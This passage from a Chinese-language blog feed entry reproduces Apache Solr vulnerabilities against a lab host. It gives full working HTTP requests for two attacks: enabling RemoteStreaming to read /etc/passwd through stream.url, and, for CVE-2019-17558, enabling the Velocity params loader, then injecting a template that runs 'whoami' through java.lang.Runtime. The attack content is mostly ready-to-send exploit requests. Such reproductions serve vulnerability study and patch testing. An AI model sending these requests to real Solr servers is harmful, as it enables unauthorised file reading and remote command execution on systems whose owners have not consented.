/solr/admin/cores?_=1637649371526&amp;amp;show=schema&amp;amp;wt=json HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.8.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: application/json, text/plain, */*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://192.168.8.128:8983/solr/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X-Requested-With: XMLHttpRequest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DNT: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;存在的 core 名为 demo&lt;br&gt;
&lt;img src=&#34;b07e466a79ac15b0597a2354b9a7f378.png&#34; alt=&#34;b07e466a79ac15b0597a2354b9a7f378.png&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;修改 demo 的配置，开启 RemoteStreaming&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /solr/demo/config?_=1637649371526&amp;amp;show=schema&amp;amp;wt=json HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.8.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: application/json, text/plain, */*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://192.168.8.128:8983/solr/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X-Requested-With: XMLHttpRequest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DNT: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;quot;set-property&amp;quot; : &amp;#123;&amp;quot;requestDispatcher.requestParsers.enableRemoteStreaming&amp;quot;:true&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当出现以下信息时，表示漏洞可能存在:&lt;br&gt;
This response format is experimental.  It is likely to change in the future&lt;br&gt;
&lt;img src=&#34;240c340be0b4a48321e3bfa01a8bdebd.png&#34; alt=&#34;240c340be0b4a48321e3bfa01a8bdebd.png&#34;&gt;&lt;br&gt;
3. 读取敏感文件&lt;br&gt;
数据包：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET /solr/demo/debug/dump?param=ContentStreams&amp;amp;stream.url=file:///etc/passwd HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.8.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: application/json, text/plain, */*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://192.168.8.128:8983/solr/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X-Requested-With: XMLHttpRequest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DNT: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;读取成功&lt;br&gt;
&lt;img src=&#34;e6a8a0fa5ab5ce46c52d3877e991197b.png&#34; alt=&#34;e6a8a0fa5ab5ce46c52d3877e991197b.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;cve-2019-17558&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2019-17558&#34;&gt;#&lt;/a&gt; CVE-2019-17558&lt;/h1&gt;
&lt;h2 id=&#34;影响版本-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#影响版本-4&#34;&gt;#&lt;/a&gt; 影响版本&lt;/h2&gt;
&lt;p&gt;5.0.0 &amp;lt;=Apache Solr&amp;lt;= 8.3.1&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞复现&#34;&gt;#&lt;/a&gt; 漏洞复现&lt;/h2&gt;
&lt;p&gt;用户可以注入自定义模板，通过 Velocity 模板语言执行任意命令&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;获取 core&lt;br&gt;
 当前存在的 core 为 demo&lt;br&gt;
&lt;img src=&#34;e88cbca22f51a1d4843dbf5dd4fa5339.png&#34; alt=&#34;e88cbca22f51a1d4843dbf5dd4fa5339.png&#34;&gt;&lt;/li&gt;
&lt;li&gt;修改 demo 的配置，开启 params.resource.loader.enabled 配置&lt;br&gt;
数据包：&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /solr/demo/config?_=1637649371526&amp;amp;show=schema&amp;amp;wt=json HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.8.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: application/json, text/plain, */*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://192.168.8.128:8983/solr/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X-Requested-With: XMLHttpRequest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DNT: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 261&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type:application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;update-queryresponsewriter&amp;quot;: &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;startup&amp;quot;: &amp;quot;lazy&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;name&amp;quot;: &amp;quot;velocity&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;class&amp;quot;: &amp;quot;solr.VelocityResponseWriter&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;template.base.dir&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;solr.resource.loader.enabled&amp;quot;: &amp;quot;true&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;params.resource.loader.enabled&amp;quot;: &amp;quot;true&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;.8f730000e51cf9135817b1b634c260f7.png&#34; alt=&#34;8f730000e51cf9135817b1b634c260f7.png&#34;&gt;&lt;br&gt;
3. Velocity 模板代码注入&lt;br&gt;
数据包：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET /solr/demo/select?q=1&amp;amp;&amp;amp;wt=velocity&amp;amp;v.template=custom&amp;amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.8.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: application/json, text/plain, */*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://192.168.8.128:8983/solr/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X-Requested-With: XMLHttpRequest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DNT: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;命令执行成功&lt;br&gt;
&lt;img src=&#34;f9466bd1a48ca275a93276b87fd78e46.png&#34; alt=&#34;f9466bd1a48ca275a93276b87fd78e46.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;传送门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#传送门&#34;&gt;#&lt;/a&gt; 传送门：&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/374041499&#34;&gt;搜索引擎 Solr 介绍&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://segmentfault.com/a/1190000013822385&#34;&gt; Lucene 就是这么简单&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://blog.csdn.net/whatday/article/details/106974271&#34;&gt; cve-2017-12629 apache solr xxe &amp;amp; rce 漏洞分析&lt;/a&gt;（6）&lt;/p&gt;
&lt;p&gt;Copyright ©milkii0&lt;/p&gt;
</content>
        <category term="solr, 漏洞复现" />
        <updated>2022-06-10T01:10:46.000Z</updated>
    </entry>
</feed>
